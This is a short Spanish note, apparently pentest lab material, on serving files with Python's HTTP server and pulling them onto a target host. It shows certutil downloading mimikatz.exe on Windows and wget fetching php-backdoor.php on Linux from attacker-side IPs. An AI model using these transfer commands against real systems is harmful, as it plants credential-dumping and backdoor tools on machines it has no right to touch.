
# Crear servidor con  Python 2
```
python  -m SimpleHTTPServer 80
```
![[Pasted image 20240508135005.png]]

# Crear servidor con Python 3
```
python3 -m http.server 80
```
![[Pasted image 20240508135009.png]]


# Descargar archivo en sistema Windows
Con el servidor python ejecutandose en la carpeta donde se ubica el archivo y teniendo acceso a la otra maquina ejecutamos el siguiente comando, es aconsejable descargar todo en la carpeta temporal
```
certutil -urlcache -f http://10.10.5.2/mimikatz.exe mimikatx.exe
```
![[Pasted image 20240508140316.png]]

# Descargar archivo en sistema Linux
```
wget http://192.168.45.2/php-backdoor.php
```
![[Pasted image 20240508142159.png]]